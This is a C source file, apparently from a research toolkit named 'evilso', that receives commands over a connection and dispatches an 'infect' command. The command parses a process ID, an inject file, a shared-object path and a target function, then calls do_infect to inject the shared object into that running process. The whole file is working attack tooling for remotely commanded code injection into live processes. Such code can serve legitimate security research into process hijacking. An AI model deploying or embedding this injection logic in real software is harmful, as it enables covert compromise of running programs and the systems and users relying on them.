/*
 * Copyright (c) 2018, Shawn Webb
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 *    * Redistributions of source code must retain the above copyright
 *      notice, this list of conditions and the following disclaimer.
 *    * Redistributions in binary form must reproduce the above
 *      copyright notice, this list of conditions and the following
 *      disclaimer in the documentation and/or other materials
 *      provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
 * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
 * INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
 * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
 * OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/param.h>

#include <hijack.h>
#include <infect.h>

#include "evilso.h"

static void cmd_infect(int, char *, size_t);

cmd_t cmds[] = {
	{
		"infect",
		cmd_infect
	},
};

void
run_cmds(int s, char *msg, size_t sz)
{
	size_t i;

	for (i = 0; i < nitems(cmds); i++) {
		if (!strncmp(msg, cmds[i].c_cmdstr,
		    strlen(cmds[i].c_cmdstr))) {
			printf("Running %s cmd\n", cmds[i].c_cmdstr);
			cmds[i].c_act(s, msg, sz);
		}
	}
}

static void
cmd_infect(int s, char *msg, size_t sz)
{
	char *pidstr, *inject, *so, *targetfunc;
	char *p1, *p2;
	pid_t pid;

	pidstr = inject = so = targetfunc = NULL;

	p1 = strchr(msg, ' ');
	if (p1 == NULL)
		return;

	pidstr = ++p1;

	p2 = strchr(p1, ' ');
	if (p2 == NULL)
		return;

	*p2++ = '\0';
	inject = p2;

	p1 = strchr(p2, ' ');
	if (p1 == NULL)
		return;

	*p1++ = '\0';
	so = p1;

	p2 = strchr(p1, ' ');
	if (p2 == NULL)
		return;

	*p2++ = '\0';
	targetfunc = p2;

	p1 = strchr(p2, '\n');
	if (p1 != NULL)
		*p1 = '\0';

	if (sscanf(pidstr, "%d", &pid) != 1)
		return;

	do_infect(pid, inject, so, targetfunc);

	return;
}
